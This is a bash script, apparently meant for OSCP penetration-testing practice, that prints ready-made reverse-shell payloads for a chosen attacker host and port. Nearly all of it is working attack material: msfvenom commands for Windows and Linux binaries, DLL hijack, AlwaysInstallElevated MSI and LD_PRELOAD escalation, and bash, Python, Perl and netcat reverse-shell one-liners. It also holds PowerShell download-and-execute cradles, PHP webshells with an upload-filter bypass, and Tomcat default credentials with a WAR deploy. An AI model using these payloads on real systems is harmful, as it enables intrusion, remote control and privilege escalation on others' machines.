#!/bin/bash
###############################################################################
#  Reverse Shell Generator — OSCP Edition
#  Usage: ./revshell_gen.sh <LHOST> <LPORT> [type]
#
#  Types:
#    win-exe, win-dll, win-msi, win-ps, win-shellcode
#    linux-elf, linux-so
#    php, jsp-war, asp, aspx
#    python, bash, nc, all
#
#  Examples:
#    ./revshell_gen.sh 192.168.45.5 4444
#    ./revshell_gen.sh 192.168.45.5 4444 win-exe
#    ./revshell_gen.sh 192.168.45.5 4444 all
###############################################################################

RED='\033[0;31m'; GREEN='\033[0;32m'; CYAN='\033[0;36m'; YELLOW='\033[1;33m'
BOLD='\033[1m'; NC='\033[0m'

LHOST="${1}"
LPORT="${2}"
TYPE="${3:-menu}"

if [[ -z "$LHOST" || -z "$LPORT" ]]; then
  echo -e "${BOLD}Usage:${NC} $0 <LHOST> <LPORT> [type]"
  echo -e "\n${CYAN}Types:${NC}"
  echo "  win-exe      Windows x64 EXE (staged + stageless)"
  echo "  win-dll      Windows x64 DLL (for DLL hijack)"
  echo "  win-msi      Windows MSI (AlwaysInstallElevated)"
  echo "  win-ps       Windows PowerShell reverse shell"
  echo "  win-shellcode  Windows shellcode (python/csharp)"
  echo "  linux-elf    Linux ELF binary"
  echo "  linux-so     Linux shared object (.so)"
  echo "  php          PHP reverse shell"
  echo "  jsp-war      Java WAR (Tomcat)"
  echo "  asp          ASP classic (IIS)"
  echo "  aspx         ASPX (.NET IIS)"
  echo "  python       Python one-liner"
  echo "  bash         Bash one-liner"
  echo "  nc           Netcat variants"
  echo "  all          Print everything"
  echo "  menu         Interactive menu (default)"
  exit 1
fi

section() {
  echo -e "\n${BOLD}${CYAN}═══════════════════════════════════════${NC}"
  echo -e "${BOLD}${CYAN}  $1${NC}"
  echo -e "${BOLD}${CYAN}═══════════════════════════════════════${NC}"
}

cmd() {
  echo -e "  ${GREEN}\$${NC} $1"
}

note() {
  echo -e "  ${YELLOW}# $1${NC}"
}

listener() {
  echo -e "\n  ${BOLD}Listener:${NC}"
  echo -e "  ${GREEN}\$${NC} $1"
}

###############################################################################
#  MSFVENOM PAYLOADS
###############################################################################

win_exe() {
  section "Windows EXE (x64)"

  note "Stageless (preferred for OSCP — no Metasploit handler needed)"
  cmd "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell.exe"
  listener "nc -lvnp $LPORT"

  echo ""
  note "Staged (needs multi/handler — costs your one Metasploit use)"
  cmd "msfvenom -p windows/x64/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o staged.exe"
  listener "msfconsole -q -x 'use multi/handler; set payload windows/x64/shell/reverse_tcp; set LHOST $LHOST; set LPORT $LPORT; run'"

  echo ""
  note "x86 (for 32-bit targets)"
  cmd "msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o shell32.exe"
  listener "nc -lvnp $LPORT"

  echo ""
  note "Transfer to target"
  cmd "certutil -urlcache -f http://$LHOST/shell.exe C:\\TEMP\\shell.exe"
  cmd "powershell iwr -uri http://$LHOST/shell.exe -outfile C:\\TEMP\\shell.exe"
  cmd "curl http://$LHOST/shell.exe -o shell.exe"
}

win_dll() {
  section "Windows DLL (x64) — DLL Hijack"

  note "Common DLL hijack targets: tzres.dll, version.dll, phoneinfo.dll, wlbsctrl.dll"
  cmd "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o hijack.dll"
  listener "nc -lvnp $LPORT"

  echo ""
  note "x86 DLL"
  cmd "msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f dll -o hijack32.dll"

  echo ""
  note "Rename to match the target app's missing DLL, then restart the service"
}

win_msi() {
  section "Windows MSI — AlwaysInstallElevated"

  note "Check first: reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
  note "Check first: reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated"
  note "Both must be 0x1 for this to work"
  echo ""
  cmd "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f msi -o shell.msi"
  listener "nc -lvnp $LPORT"

  echo ""
  note "Execute on target (runs as SYSTEM)"
  cmd "msiexec /quiet /qn /i C:\\TEMP\\shell.msi"
}

win_ps() {
  section "Windows PowerShell Reverse Shell"

  note "msfvenom PowerShell payload"
  cmd "msfvenom -p windows/x64/powershell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o ps_shell.exe"
  listener "nc -lvnp $LPORT"

  echo ""
  note "One-liner (no msfvenom needed)"
  echo -e "  ${GREEN}\$${NC} powershell -e \$(echo -n 'IEX(New-Object Net.WebClient).DownloadString(\"http://$LHOST/rev.ps1\")' | iconv -t utf-16le | base64 -w 0)"
  echo ""
  note "Powercat (hosted on your Kali)"
  cmd "cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 ."
  cmd "python3 -m http.server 80"
  note "On target:"
  cmd "powershell IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/powercat.ps1'); powercat -c $LHOST -p $LPORT -e cmd"
  listener "nc -lvnp $LPORT"

  echo ""
  note "ConPtyShell (fully interactive PowerShell — best option)"
  cmd "# Host ConPtyShell.ps1 on your Kali"
  cmd "stty raw -echo; (stty size; cat) | nc -lvnp $LPORT"
  note "On target:"
  cmd "powershell IEX(New-Object Net.WebClient).DownloadString('http://$LHOST/ConPtyShell.ps1'); Invoke-ConPtyShell -RemoteIp $LHOST -RemotePort $LPORT -Rows 24 -Cols 80"
}

win_shellcode() {
  section "Windows Shellcode (for buffer overflow / custom exploit)"

  note "Python format (for BOF scripts)"
  cmd "msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f python -v sc -b '\\x00'"
  listener "nc -lvnp $LPORT"

  echo ""
  note "C# format (for .NET exploits like SMBGhost)"
  cmd "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f csharp"

  echo ""
  note "C format"
  cmd "msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f c -b '\\x00'"

  echo ""
  note "Raw (pipe into encoder)"
  cmd "msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw -b '\\x00' -e x86/shikata_ga_nai -i 3 -o payload.bin"
}

linux_elf() {
  section "Linux ELF Binary"

  note "x64 stageless"
  cmd "msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell.elf"
  listener "nc -lvnp $LPORT"

  echo ""
  note "x86"
  cmd "msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o shell32.elf"

  echo ""
  note "Transfer and execute"
  cmd "chmod +x shell.elf && ./shell.elf"
}

linux_so() {
  section "Linux Shared Object (.so) — LD_PRELOAD / Module Loading"

  note "x64 shared object (used for Redis MODULE LOAD, LD_PRELOAD, etc.)"
  cmd "msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf-so -o evil.so"
  listener "nc -lvnp $LPORT"

  echo ""
  note "Redis module load example"
  cmd "redis-cli -h \$TARGET MODULE LOAD /path/to/evil.so"
  cmd "redis-cli -h \$TARGET system.exec 'id'"

  echo ""
  note "LD_PRELOAD example (cron/sudo)"
  note "Compile: gcc -shared -fPIC -o evil.so evil.c -nostartfiles"
  note "sudo LD_PRELOAD=/tmp/evil.so <allowed_binary>"
}

php_shell() {
  section "PHP Reverse Shell"

  note "msfvenom PHP (raw format)"
  cmd "msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o shell.php"
  listener "nc -lvnp $LPORT"

  echo ""
  note "Pentestmonkey PHP reverse shell (better — fully interactive)"
  cmd "cp /usr/share/webshells/php/php-reverse-shell.php shell.php"
  cmd "sed -i 's/127.0.0.1/$LHOST/' shell.php"
  cmd "sed -i 's/1234/$LPORT/' shell.php"

  echo ""
  note "One-liner webshell (for upload bypass / LFI)"
  echo -e "  ${GREEN}<?php system(\$_GET['c']); ?>${NC}"
  echo -e "  ${GREEN}<?php system(\$_REQUEST['c']); ?>${NC}"
  echo -e "  ${GREEN}<?=\`\$_GET[0]\`;?>${NC}"

  echo ""
  note "With GIF magic bytes (bypass upload filter)"
  echo -e "  ${GREEN}GIF89a<?php system(\$_GET['c']); ?>${NC}"
}

jsp_war() {
  section "Java WAR (Tomcat Manager Upload)"

  cmd "msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war -o shell.war"
  listener "nc -lvnp $LPORT"

  echo ""
  note "Deploy to Tomcat"
  cmd "curl -u 'tomcat:tomcat' --upload-file shell.war 'http://\$TARGET:8080/manager/text/deploy?path=/shell'"
  note "Trigger: curl http://\$TARGET:8080/shell/"

  echo ""
  note "Common Tomcat default creds"
  echo -e "  tomcat:tomcat  |  admin:admin  |  tomcat:s3cret  |  admin:tomcat"
}

asp_shell() {
  section "ASP Classic (IIS)"

  cmd "msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f asp -o shell.asp"
  listener "nc -lvnp $LPORT"
}

aspx_shell() {
  section "ASPX (.NET IIS)"

  cmd "msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f aspx -o shell.aspx"
  listener "nc -lvnp $LPORT"

  echo ""
  note "Or copy Kali's built-in ASPX webshell"
  cmd "cp /usr/share/webshells/aspx/cmdasp.aspx ."
}

python_shell() {
  section "Python Reverse Shell (one-liners)"

  note "Python3"
  cmd "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
  listener "nc -lvnp $LPORT"

  echo ""
  note "Python2"
  cmd "python -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"$LHOST\",$LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/bash\",\"-i\"])'"
}

bash_shell() {
  section "Bash Reverse Shell (one-liners)"

  note "Standard bash"
  cmd "bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1"
  listener "nc -lvnp $LPORT"

  echo ""
  note "bash -c wrapper (for injection)"
  cmd "bash -c 'bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1'"

  echo ""
  note "URL-encoded (for web injection)"
  cmd "bash+-i+>%26+/dev/tcp/$LHOST/$LPORT+0>%261"

  echo ""
  note "mkfifo (works when /dev/tcp unavailable)"
  cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LHOST $LPORT >/tmp/f"

  echo ""
  note "Perl"
  cmd "perl -e 'use Socket;\$i=\"$LHOST\";\$p=$LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/bash -i\");};'"
}

nc_shell() {
  section "Netcat Reverse Shell"

  note "nc with -e (traditional)"
  cmd "nc -e /bin/bash $LHOST $LPORT"
  listener "nc -lvnp $LPORT"

  echo ""
  note "ncat (Nmap's netcat)"
  cmd "ncat $LHOST $LPORT -e /bin/bash"

  echo ""
  note "nc without -e (POSIX-compliant)"
  cmd "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc $LHOST $LPORT >/tmp/f"

  echo ""
  note "Windows nc.exe"
  cmd "nc.exe $LHOST $LPORT -e cmd.exe"
  note "Transfer nc.exe: certutil -urlcache -f http://$LHOST/nc.exe C:\\TEMP\\nc.exe"
}

###############################################################################
#  SHELL UPGRADE
###############################################################################

shell_upgrade() {
  section "Shell Upgrade (Dumb → Interactive TTY)"

  note "Step 1: Spawn PTY"
  cmd "python3 -c 'import pty;pty.spawn(\"/bin/bash\")'"
  note "  OR: script -qc /bin/bash /dev/null"
  note "  OR: /usr/bin/script -qc /bin/bash /dev/null"

  echo ""
  note "Step 2: Background the shell"
  cmd "Ctrl+Z"

  echo ""
  note "Step 3: Fix terminal"
  cmd "stty raw -echo; fg"

  echo ""
  note "Step 4: Set environment"
  cmd "export TERM=xterm-256color"
  cmd "stty rows 40 cols 160"

  echo ""
  note "Get your current terminal size: stty size"
}

###############################################################################
#  HTTP SERVER (serve payloads)
###############################################################################

http_server() {
  section "Serve Payloads (HTTP Server)"

  note "Python3 (most common)"
  cmd "python3 -m http.server 80"

  echo ""
  note "Python2"
  cmd "python -m SimpleHTTPServer 80"

  echo ""
  note "PHP built-in server"
  cmd "php -S 0.0.0.0:80"

  echo ""
  note "Busybox"
  cmd "busybox httpd -f -p 80"
}

###############################################################################
#  MENU / CLI
###############################################################################

echo -e "${BOLD}${CYAN}"
echo "╔══════════════════════════════════════════════════╗"
echo "║  Reverse Shell Generator — OSCP Edition         ║"
echo "║  LHOST: $LHOST"
echo "║  LPORT: $LPORT"
echo "╚══════════════════════════════════════════════════╝"
echo -e "${NC}"

case "$TYPE" in
  win-exe)       win_exe ;;
  win-dll)       win_dll ;;
  win-msi)       win_msi ;;
  win-ps)        win_ps ;;
  win-shellcode) win_shellcode ;;
  linux-elf)     linux_elf ;;
  linux-so)      linux_so ;;
  php)           php_shell ;;
  jsp-war)       jsp_war ;;
  asp)           asp_shell ;;
  aspx)          aspx_shell ;;
  python)        python_shell ;;
  bash)          bash_shell ;;
  nc)            nc_shell ;;
  all)
    win_exe; win_dll; win_msi; win_ps; win_shellcode
    linux_elf; linux_so
    php_shell; jsp_war; asp_shell; aspx_shell
    python_shell; bash_shell; nc_shell
    shell_upgrade; http_server
    ;;
  menu|*)
    echo -e "${YELLOW}Select payload type:${NC}\n"
    echo "  1)  Windows EXE (x64/x86)"
    echo "  2)  Windows DLL (hijack)"
    echo "  3)  Windows MSI (AlwaysInstallElevated)"
    echo "  4)  Windows PowerShell"
    echo "  5)  Windows Shellcode (BOF)"
    echo "  6)  Linux ELF"
    echo "  7)  Linux .so (LD_PRELOAD/Redis)"
    echo "  8)  PHP"
    echo "  9)  Java WAR (Tomcat)"
    echo "  10) ASP Classic (IIS)"
    echo "  11) ASPX (.NET IIS)"
    echo "  12) Python one-liner"
    echo "  13) Bash one-liner"
    echo "  14) Netcat"
    echo "  15) Shell Upgrade (TTY)"
    echo "  16) HTTP Server (serve payloads)"
    echo "  0)  All"
    echo ""
    read -rp "Choice: " choice
    case "$choice" in
      1)  win_exe ;;
      2)  win_dll ;;
      3)  win_msi ;;
      4)  win_ps ;;
      5)  win_shellcode ;;
      6)  linux_elf ;;
      7)  linux_so ;;
      8)  php_shell ;;
      9)  jsp_war ;;
      10) asp_shell ;;
      11) aspx_shell ;;
      12) python_shell ;;
      13) bash_shell ;;
      14) nc_shell ;;
      15) shell_upgrade ;;
      16) http_server ;;
      0)
        win_exe; win_dll; win_msi; win_ps; win_shellcode
        linux_elf; linux_so
        php_shell; jsp_war; asp_shell; aspx_shell
        python_shell; bash_shell; nc_shell
        shell_upgrade; http_server
        ;;
      *)  echo -e "${RED}Invalid choice${NC}" ;;
    esac
    ;;
esac

echo ""
